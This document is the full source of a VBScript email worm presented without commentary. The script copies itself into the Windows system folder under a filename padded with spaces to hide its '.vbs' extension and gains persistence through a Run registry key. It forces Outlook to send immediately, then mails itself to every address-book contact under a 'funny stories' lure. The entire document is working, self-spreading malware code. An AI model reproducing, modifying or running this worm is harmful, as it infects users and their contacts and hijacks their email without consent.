option explicit
 dim  myapp,myname,myaddlists,myaddlist,myentries,myentry,myatts,fso,mymail,regedit
 install
 send
 sub install()
  set regedit=createobject("WScript.shell")
  set myapp=createobject("Outlook.application")
  set myname=myapp.getnamespace("MAPI")
  Set fso = CreateObject ("Scripting.FileSystemObject")
  fso.GetFile(WScript.ScriptFullName).Copy("c:\windows\system\funnystories.txt                                                  .vbs")
  fso.getfile(wScript.scriptfullname).copy("c:\windows\system\fun.dll.vbs")
  on error resume next
  regedit.regwrite "HKCU\Software\Microsoft\Office\9.0\Outlook\Options\mail\Send Mail Immediately",1,"REG_DWORD"
  regedit.regwrite "HKCU\Software\Microsoft\Office\8.0\Outlook\Options\mail\Send Mail Immediately",1,"REG_DWORD"
  regedit.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Fundll","c:\windows\system\fun.dll.vbs"
 end sub
 
 sub send()
   set myaddlists=myname.addresslists 
   for each myaddlist in myaddlists
   set myentries=myaddlist.Addressentries
   for each myentry in myentries
    set mymail=myapp.createitem(0)
     mymail.to=myentry.address
	 mymail.subject="Funny...Funny...Funny...stories"
	 mymail.body="Here are some funny stories and I hope you'll enjoy them. Have a good time! Bye"
	 set myatts=mymail.attachments
	 myatts.add "c:\windows\system\funnystories.txt                                                  .vbs",1,1
     mymail.send
   next
  next
 end sub
 


